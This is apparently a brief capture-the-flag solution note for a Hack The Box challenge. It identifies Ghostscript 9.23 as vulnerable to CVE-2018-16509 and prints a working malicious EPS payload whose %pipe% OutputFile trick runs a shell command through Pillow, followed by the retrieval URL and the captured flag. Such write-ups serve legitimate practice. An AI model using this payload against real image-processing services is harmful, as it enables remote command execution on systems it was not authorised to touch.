'''

https://1dayluo.github.io/post/htb-petpet-rcbee/

In docker file, we found ghostscript-9.23
Google ghostscript-9.23 exploit 
Python PIL/Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509
https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509

%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops

http://188.166.151.80:31967/static/petpets/flag.txt
HTB{c0mfy_bzzzzz_rcb33s_v1b3s}

'''
